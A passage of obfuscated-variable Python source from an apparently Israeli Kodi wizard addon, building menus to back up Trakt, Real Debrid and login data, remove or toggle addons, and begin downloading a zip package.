	addFile ('%s שמירת הרחבות שהתקנתי:  '%OO0OOOOOO0O0OO00O .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OOO0O0OO0OO0OO000 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3150
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O000O00OO0O00OOOO .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3153
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O00OOO000000OO0O0 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3154
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0000O00O00O0OOO0 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3155
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO0O00OOOOOOOOO00 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3157
	addFile ('%s שמירת פליליסט לאודר:  '%O0O0O000OOOO0OOO0 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3158
	addFile ('%s שמירת הגדרות באפר: '%O0OOOOO0OO000OO0O .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3163
	addFile ('%s שמירת רשימות ריפו:  '%O00O000OO00O0O000 .replace ('true',O0000000OO0O0000O ).replace ('false',OOO00000OO0OO000O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3165
	setView ('files','viewType')#line:3167
def traktMenu ():#line:3169
	O0O0OO0OOOOO0000O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3170
	OOO0OO0000O0O000O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3171
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3172
	addFile ('Save Trakt Data: %s'%O0O0OO0OOOOO0000O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3173
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOO0OO0000O0O000O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3174
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3175
	for O0O0OO0OOOOO0000O in traktit .ORDER :#line:3177
		O000OO00O00OO0O00 =TRAKTID [O0O0OO0OOOOO0000O ]['name']#line:3178
		OOOOOOO00OO0O00OO =TRAKTID [O0O0OO0OOOOO0000O ]['path']#line:3179
		OO0OO000OO0OO000O =TRAKTID [O0O0OO0OOOOO0000O ]['saved']#line:3180
		OOOOOOOO0000OOOOO =TRAKTID [O0O0OO0OOOOO0000O ]['file']#line:3181
		O0OOOOO00OOO00OO0 =wiz .getS (OO0OO000OO0OO000O )#line:3182
		OO00O000OOO00O000 =traktit .traktUser (O0O0OO0OOOOO0000O )#line:3183
		O00O00OOOOO0OOOO0 =TRAKTID [O0O0OO0OOOOO0000O ]['icon']if os .path .exists (OOOOOOO00OO0O00OO )else ICONTRAKT #line:3184
		O0OO0000O000OOO0O =TRAKTID [O0O0OO0OOOOO0000O ]['fanart']if os .path .exists (OOOOOOO00OO0O00OO )else FANART #line:3185
		OOOOO00OOOO0OO0OO =createMenu ('saveaddon','Trakt',O0O0OO0OOOOO0000O )#line:3186
		OOOO0O0OOO000OO00 =createMenu ('save','Trakt',O0O0OO0OOOOO0000O )#line:3187
		OOOOO00OOOO0OO0OO .append ((THEME2 %'%s Settings'%O000OO00O00OO0O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0O0OO0OOOOO0000O )))#line:3188
		addFile ('[+]-> %s'%O000OO00O00OO0O00 ,'',icon =O00O00OOOOO0OOOO0 ,fanart =O0OO0000O000OOO0O ,themeit =THEME3 )#line:3190
		if not os .path .exists (OOOOOOO00OO0O00OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O00OOOOO0OOOO0 ,fanart =O0OO0000O000OOO0O ,menu =OOOOO00OOOO0OO0OO )#line:3191
		elif not OO00O000OOO00O000 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0O0OO0OOOOO0000O ,icon =O00O00OOOOO0OOOO0 ,fanart =O0OO0000O000OOO0O ,menu =OOOOO00OOOO0OO0OO )#line:3192
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00O000OOO00O000 ,'authtrakt',O0O0OO0OOOOO0000O ,icon =O00O00OOOOO0OOOO0 ,fanart =O0OO0000O000OOO0O ,menu =OOOOO00OOOO0OO0OO )#line:3193
		if O0OOOOO00OOO00OO0 =="":#line:3194
			if os .path .exists (OOOOOOOO0000OOOOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0O0OO0OOOOO0000O ,icon =O00O00OOOOO0OOOO0 ,fanart =O0OO0000O000OOO0O ,menu =OOOO0O0OOO000OO00 )#line:3195
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0O0OO0OOOOO0000O ,icon =O00O00OOOOO0OOOO0 ,fanart =O0OO0000O000OOO0O ,menu =OOOO0O0OOO000OO00 )#line:3196
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOOOO00OOO00OO0 ,'',icon =O00O00OOOOO0OOOO0 ,fanart =O0OO0000O000OOO0O ,menu =OOOO0O0OOO000OO00 )#line:3197
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3199
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3200
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3201
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3202
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3203
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3204
	setView ('files','viewType')#line:3205
def realMenu ():#line:3207
	OO0000O000000OOOO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3208
	O0O00OO00OO0OO0OO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3209
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3210
	addFile ('Save Real Debrid Data: %s'%OO0000O000000OOOO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3211
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0O00OO00OO0OO0OO ),'',icon =ICONREAL ,themeit =THEME3 )#line:3212
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3213
	for O000OOOOO0O00O0OO in debridit .ORDER :#line:3215
		OO00OO0OOOO00OOOO =DEBRIDID [O000OOOOO0O00O0OO ]['name']#line:3216
		OO00O000O00OO0OOO =DEBRIDID [O000OOOOO0O00O0OO ]['path']#line:3217
		OOOO00OOO00OO00O0 =DEBRIDID [O000OOOOO0O00O0OO ]['saved']#line:3218
		O000OO0000OOOO00O =DEBRIDID [O000OOOOO0O00O0OO ]['file']#line:3219
		O0O0O0000000OOOO0 =wiz .getS (OOOO00OOO00OO00O0 )#line:3220
		OOO0O00OOOOO0OO00 =debridit .debridUser (O000OOOOO0O00O0OO )#line:3221
		O00OO00OOOOOOOOO0 =DEBRIDID [O000OOOOO0O00O0OO ]['icon']if os .path .exists (OO00O000O00OO0OOO )else ICONREAL #line:3222
		OOO000OO0OOO0OOO0 =DEBRIDID [O000OOOOO0O00O0OO ]['fanart']if os .path .exists (OO00O000O00OO0OOO )else FANART #line:3223
		OO0OO0OO00OO0O0O0 =createMenu ('saveaddon','Debrid',O000OOOOO0O00O0OO )#line:3224
		O0OOOOOO0OO00O0OO =createMenu ('save','Debrid',O000OOOOO0O00O0OO )#line:3225
		OO0OO0OO00OO0O0O0 .append ((THEME2 %'%s Settings'%OO00OO0OOOO00OOOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O000OOOOO0O00O0OO )))#line:3226
		addFile ('[+]-> %s'%OO00OO0OOOO00OOOO ,'',icon =O00OO00OOOOOOOOO0 ,fanart =OOO000OO0OOO0OOO0 ,themeit =THEME3 )#line:3228
		if not os .path .exists (OO00O000O00OO0OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00OO00OOOOOOOOO0 ,fanart =OOO000OO0OOO0OOO0 ,menu =OO0OO0OO00OO0O0O0 )#line:3229
		elif not OOO0O00OOOOO0OO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O000OOOOO0O00O0OO ,icon =O00OO00OOOOOOOOO0 ,fanart =OOO000OO0OOO0OOO0 ,menu =OO0OO0OO00OO0O0O0 )#line:3230
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0O00OOOOO0OO00 ,'authdebrid',O000OOOOO0O00O0OO ,icon =O00OO00OOOOOOOOO0 ,fanart =OOO000OO0OOO0OOO0 ,menu =OO0OO0OO00OO0O0O0 )#line:3231
		if O0O0O0000000OOOO0 =="":#line:3232
			if os .path .exists (O000OO0000OOOO00O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O000OOOOO0O00O0OO ,icon =O00OO00OOOOOOOOO0 ,fanart =OOO000OO0OOO0OOO0 ,menu =O0OOOOOO0OO00O0OO )#line:3233
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O000OOOOO0O00O0OO ,icon =O00OO00OOOOOOOOO0 ,fanart =OOO000OO0OOO0OOO0 ,menu =O0OOOOOO0OO00O0OO )#line:3234
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O0000000OOOO0 ,'',icon =O00OO00OOOOOOOOO0 ,fanart =OOO000OO0OOO0OOO0 ,menu =O0OOOOOO0OO00O0OO )#line:3235
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3237
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3238
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3239
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3240
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3241
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3242
	setView ('files','viewType')#line:3243
def loginMenu ():#line:3245
	O00O0OOOO0000O000 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3246
	OO0000O0O0OOOOOO0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3247
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3248
	addFile ('Save Login Data: %s'%O00O0OOOO0000O000 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3249
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OO0000O0O0OOOOOO0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3250
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3251
	for O00O0OOOO0000O000 in loginit .ORDER :#line:3253
		OO000OO00O0OOOO0O =LOGINID [O00O0OOOO0000O000 ]['name']#line:3254
		O0000OOO00OOO0O00 =LOGINID [O00O0OOOO0000O000 ]['path']#line:3255
		OOOOO00O00O000O0O =LOGINID [O00O0OOOO0000O000 ]['saved']#line:3256
		O0000OOOO0O0O000O =LOGINID [O00O0OOOO0000O000 ]['file']#line:3257
		OOO00OO0OO0OO00OO =wiz .getS (OOOOO00O00O000O0O )#line:3258
		O0O00O0OOO0O000OO =loginit .loginUser (O00O0OOOO0000O000 )#line:3259
		OO0000OOO0O000O00 =LOGINID [O00O0OOOO0000O000 ]['icon']if os .path .exists (O0000OOO00OOO0O00 )else ICONLOGIN #line:3260
		O00O00O00000OOO00 =LOGINID [O00O0OOOO0000O000 ]['fanart']if os .path .exists (O0000OOO00OOO0O00 )else FANART #line:3261
		OOO00O000OO0O0OOO =createMenu ('saveaddon','Login',O00O0OOOO0000O000 )#line:3262
		OOOO0OO0O000OO00O =createMenu ('save','Login',O00O0OOOO0000O000 )#line:3263
		OOO00O000OO0O0OOO .append ((THEME2 %'%s Settings'%OO000OO00O0OOOO0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O00O0OOOO0000O000 )))#line:3264
		addFile ('[+]-> %s'%OO000OO00O0OOOO0O ,'',icon =OO0000OOO0O000O00 ,fanart =O00O00O00000OOO00 ,themeit =THEME3 )#line:3266
		if not os .path .exists (O0000OOO00OOO0O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0000OOO0O000O00 ,fanart =O00O00O00000OOO00 ,menu =OOO00O000OO0O0OOO )#line:3267
		elif not O0O00O0OOO0O000OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O00O0OOOO0000O000 ,icon =OO0000OOO0O000O00 ,fanart =O00O00O00000OOO00 ,menu =OOO00O000OO0O0OOO )#line:3268
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O00O0OOO0O000OO ,'authlogin',O00O0OOOO0000O000 ,icon =OO0000OOO0O000O00 ,fanart =O00O00O00000OOO00 ,menu =OOO00O000OO0O0OOO )#line:3269
		if OOO00OO0OO0OO00OO =="":#line:3270
			if os .path .exists (O0000OOOO0O0O000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O00O0OOOO0000O000 ,icon =OO0000OOO0O000O00 ,fanart =O00O00O00000OOO00 ,menu =OOOO0OO0O000OO00O )#line:3271
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O00O0OOOO0000O000 ,icon =OO0000OOO0O000O00 ,fanart =O00O00O00000OOO00 ,menu =OOOO0OO0O000OO00O )#line:3272
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO00OO0OO0OO00OO ,'',icon =OO0000OOO0O000O00 ,fanart =O00O00O00000OOO00 ,menu =OOOO0OO0O000OO00O )#line:3273
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3275
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3276
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3277
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3278
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3279
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3280
	setView ('files','viewType')#line:3281
def fixUpdate ():#line:3283
	if KODIV <17 :#line:3284
		O0OOOO0OO0OO0O0O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3285
		try :#line:3286
			os .remove (O0OOOO0OO0OO0O0O0 )#line:3287
		except Exception as OO0O000O000O0OOOO :#line:3288
			wiz .log ("Unable to remove %s, Purging DB"%O0OOOO0OO0OO0O0O0 )#line:3289
			wiz .purgeDb (O0OOOO0OO0OO0O0O0 )#line:3290
	else :#line:3291
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3292
def removeAddonMenu ():#line:3294
	OOOO00OOOO0OOOOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3295
	O00OO0O0O00O0O000 =[];O00000OO000OOOO0O =[]#line:3296
	for OO0O0000OOO000O0O in sorted (OOOO00OOOO0OOOOOO ,key =lambda OOO00OO0O0OOOOOO0 :OOO00OO0O0OOOOOO0 ):#line:3297
		OO0OO00OOOO00OO0O =os .path .split (OO0O0000OOO000O0O [:-1 ])[1 ]#line:3298
		if OO0OO00OOOO00OO0O in EXCLUDES :continue #line:3299
		elif OO0OO00OOOO00OO0O in DEFAULTPLUGINS :continue #line:3300
		elif OO0OO00OOOO00OO0O =='packages':continue #line:3301
		O0O0O0000OOO0O00O =os .path .join (OO0O0000OOO000O0O ,'addon.xml')#line:3302
		if os .path .exists (O0O0O0000OOO0O00O ):#line:3303
			O00OO000O000O0OO0 =open (O0O0O0000OOO0O00O )#line:3304
			O0000OOO0O0O0OOOO =O00OO000O000O0OO0 .read ()#line:3305
			O0OOO00OO0000O00O =wiz .parseDOM (O0000OOO0O0O0OOOO ,'addon',ret ='id')#line:3306
			OO00O00O0O0O00OO0 =OO0OO00OOOO00OO0O if len (O0OOO00OO0000O00O )==0 else O0OOO00OO0000O00O [0 ]#line:3308
			try :#line:3309
				O0OOOOOO00OO00OOO =xbmcaddon .Addon (id =OO00O00O0O0O00OO0 )#line:3310
				O00OO0O0O00O0O000 .append (O0OOOOOO00OO00OOO .getAddonInfo ('name'))#line:3311
				O00000OO000OOOO0O .append (OO00O00O0O0O00OO0 )#line:3312
			except :#line:3313
				pass #line:3314
	if len (O00OO0O0O00O0O000 )==0 :#line:3315
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3316
		return #line:3317
	if KODIV >16 :#line:3318
		OOO00O0OO0O00O000 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00OO0O0O00O0O000 )#line:3319
	else :#line:3320
		OOO00O0OO0O00O000 =[];O000OO000000O0OOO =0 #line:3321
		O0OOOO0000OO0OOOO =["-- Click here to Continue --"]+O00OO0O0O00O0O000 #line:3322
		while not O000OO000000O0OOO ==-1 :#line:3323
			O000OO000000O0OOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OOOO0000OO0OOOO )#line:3324
			if O000OO000000O0OOO ==-1 :break #line:3325
			elif O000OO000000O0OOO ==0 :break #line:3326
			else :#line:3327
				O0OO0OOOOO0O00O0O =(O000OO000000O0OOO -1 )#line:3328
				if O0OO0OOOOO0O00O0O in OOO00O0OO0O00O000 :#line:3329
					OOO00O0OO0O00O000 .remove (O0OO0OOOOO0O00O0O )#line:3330
					O0OOOO0000OO0OOOO [O000OO000000O0OOO ]=O00OO0O0O00O0O000 [O0OO0OOOOO0O00O0O ]#line:3331
				else :#line:3332
					OOO00O0OO0O00O000 .append (O0OO0OOOOO0O00O0O )#line:3333
					O0OOOO0000OO0OOOO [O000OO000000O0OOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00OO0O0O00O0O000 [O0OO0OOOOO0O00O0O ])#line:3334
	if OOO00O0OO0O00O000 ==None :return #line:3335
	if len (OOO00O0OO0O00O000 )>0 :#line:3336
		wiz .addonUpdates ('set')#line:3337
		for O0O0O0OO0O0OO00OO in OOO00O0OO0O00O000 :#line:3338
			removeAddon (O00000OO000OOOO0O [O0O0O0OO0O0OO00OO ],O00OO0O0O00O0O000 [O0O0O0OO0O0OO00OO ],True )#line:3339
		xbmc .sleep (1000 )#line:3341
		if INSTALLMETHOD ==1 :O0O0OO0OO0O0OO0O0 =1 #line:3343
		elif INSTALLMETHOD ==2 :O0O0OO0OO0O0OO0O0 =0 #line:3344
		else :O0O0OO0OO0O0OO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3345
		if O0O0OO0OO0O0OO0O0 ==1 :wiz .reloadFix ('remove addon')#line:3346
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3347
def removeAddonDataMenu ():#line:3349
	if os .path .exists (ADDOND ):#line:3350
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3351
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3352
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3353
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3354
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3355
		OO0000O00O00OOOOO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3356
		for O0O000OO00O0O00OO in sorted (OO0000O00O00OOOOO ,key =lambda OOO0O0O0OOOO00O0O :OOO0O0O0OOOO00O0O ):#line:3357
			O00O00OOO00OO0OO0 =O0O000OO00O0O00OO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3358
			OO00O0O0O000OOO0O =os .path .join (O0O000OO00O0O00OO .replace (ADDOND ,ADDONS ),'icon.png')#line:3359
			O0000O0OO0O0OO00O =os .path .join (O0O000OO00O0O00OO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3360
			OO00O0O00000O0O00 =O00O00OOO00OO0OO0 #line:3361
			O00O0O0O0O00O0OO0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3362
			for O0O0OO0O00OO0OO0O in O00O0O0O0O00O0OO0 :#line:3363
				OO00O0O00000O0O00 =OO00O0O00000O0O00 .replace (O0O0OO0O00OO0OO0O ,O00O0O0O0O00O0OO0 [O0O0OO0O00OO0OO0O ])#line:3364
			if O00O00OOO00OO0OO0 in EXCLUDES :OO00O0O00000O0O00 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO00O0O00000O0O00 #line:3365
			else :OO00O0O00000O0O00 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO00O0O00000O0O00 #line:3366
			addFile (' %s'%OO00O0O00000O0O00 ,'removedata',O00O00OOO00OO0OO0 ,icon =OO00O0O0O000OOO0O ,fanart =O0000O0OO0O0OO00O ,themeit =THEME2 )#line:3367
	else :#line:3368
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3369
	setView ('files','viewType')#line:3370
def enableAddons ():#line:3372
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3373
	O0O0OOOO00OOO0O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3374
	OOOO00OOO0O0OO0O0 =0 #line:3375
	for O0OOOO00O0O0OOO0O in sorted (O0O0OOOO00OOO0O0O ,key =lambda O00000OO0O000O00O :O00000OO0O000O00O ):#line:3376
		OO0O0OOO0O0O0O0OO =os .path .split (O0OOOO00O0O0OOO0O [:-1 ])[1 ]#line:3377
		if OO0O0OOO0O0O0O0OO in EXCLUDES :continue #line:3378
		if OO0O0OOO0O0O0O0OO in DEFAULTPLUGINS :continue #line:3379
		OOO0O0OOO0OOOOOOO =os .path .join (O0OOOO00O0O0OOO0O ,'addon.xml')#line:3380
		if os .path .exists (OOO0O0OOO0OOOOOOO ):#line:3381
			OOOO00OOO0O0OO0O0 +=1 #line:3382
			O0O0OOOO00OOO0O0O =O0OOOO00O0O0OOO0O .replace (ADDONS ,'')[1 :-1 ]#line:3383
			OO00OO00OO0000OO0 =open (OOO0O0OOO0OOOOOOO )#line:3384
			O000OO0000OO0OOOO =OO00OO00OO0000OO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3385
			OO0OOO0OO000O000O =wiz .parseDOM (O000OO0000OO0OOOO ,'addon',ret ='id')#line:3386
			O0O00O000000O00O0 =wiz .parseDOM (O000OO0000OO0OOOO ,'addon',ret ='name')#line:3387
			try :#line:3388
				O0O0000O0OOOO0O0O =OO0OOO0OO000O000O [0 ]#line:3389
				O00OOO00OOOOOO0O0 =O0O00O000000O00O0 [0 ]#line:3390
			except :#line:3391
				continue #line:3392
			try :#line:3393
				OO0OO000OOOOO00OO =xbmcaddon .Addon (id =O0O0000O0OOOO0O0O )#line:3394
				O0000OO0000OOO00O ="[COLOR green][Enabled][/COLOR]"#line:3395
				O0OOO00OOO0OO00OO ="false"#line:3396
			except :#line:3397
				O0000OO0000OOO00O ="[COLOR red][Disabled][/COLOR]"#line:3398
				O0OOO00OOO0OO00OO ="true"#line:3399
				pass #line:3400
			OOO0O00OOOOO00000 =os .path .join (O0OOOO00O0O0OOO0O ,'icon.png')if os .path .exists (os .path .join (O0OOOO00O0O0OOO0O ,'icon.png'))else ICON #line:3401
			OO0O000O00OOOO0OO =os .path .join (O0OOOO00O0O0OOO0O ,'fanart.jpg')if os .path .exists (os .path .join (O0OOOO00O0O0OOO0O ,'fanart.jpg'))else FANART #line:3402
			addFile ("%s %s"%(O0000OO0000OOO00O ,O00OOO00OOOOOO0O0 ),'toggleaddon',O0O0OOOO00OOO0O0O ,O0OOO00OOO0OO00OO ,icon =OOO0O00OOOOO00000 ,fanart =OO0O000O00OOOO0OO )#line:3403
			OO00OO00OO0000OO0 .close ()#line:3404
	if OOOO00OOO0O0OO0O0 ==0 :#line:3405
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3406
	setView ('files','viewType')#line:3407
def changeFeq ():#line:3409
	OO000000O0O00000O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3410
	O00OOOOO0O0OO0OOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OO000000O0O00000O )#line:3411
	if not O00OOOOO0O0OO0OOO ==-1 :#line:3412
		wiz .setS ('autocleanfeq',str (O00OOOOO0O0OO0OOO ))#line:3413
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OO000000O0O00000O [O00OOOOO0O0OO0OOO ]))#line:3414
def developer ():#line:3416
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3417
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3418
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3419
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3420
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3421
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3422
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3423
	setView ('files','viewType')#line:3425
def download (OOOOO0O000OO0O000 ,OOOOOOO000O0OOOOO ):#line:3430
  OOOOOOO00O0OOOOOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3431
  O00000O0O0O000O00 =xbmcgui .DialogProgress ()#line:3432
  O00000O0O0O000O00 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3433
  OOO0OOOOOOO0OO00O =os .path .join (OOOOOOO00O0OOOOOO ,'isr.zip')#line:3434
  OOOO0O00OOOOOOO0O =urllib2 .Request (OOOOO0O000OO0O000 )#line:3435
  OOOOO00000000OO0O =urllib2 .urlopen (OOOO0O00OOOOOOO0O )#line:3436
  O0OOO00O00OO00000 =xbmcgui .DialogProgress ()#line:3438
  O0OOO00O00OO00000 .create ("Downloading","Downloading "+name )#line:3439
  O0OOO00O00OO00000 .update (0 )#line:3440
  O000000O0O0OO0OOO =OOOOOOO000O0OOOOO #line:3441
  O0OO00OO0OO000000 =open (OOO0OOOOOOO0OO00O ,'wb')#line:3442
  try :#line:3444
    O0OOO0O00OOOOOO0O =OOOOO00000000OO0O .info ().getheader ('Content-Length').strip ()#line:3445
    OOOOOOOO0OO00OO00 =True #line:3446
  except AttributeError :#line:3447
        OOOOOOOO0OO00OO00 =False #line:3448
  if OOOOOOOO0OO00OO00 :#line:3450
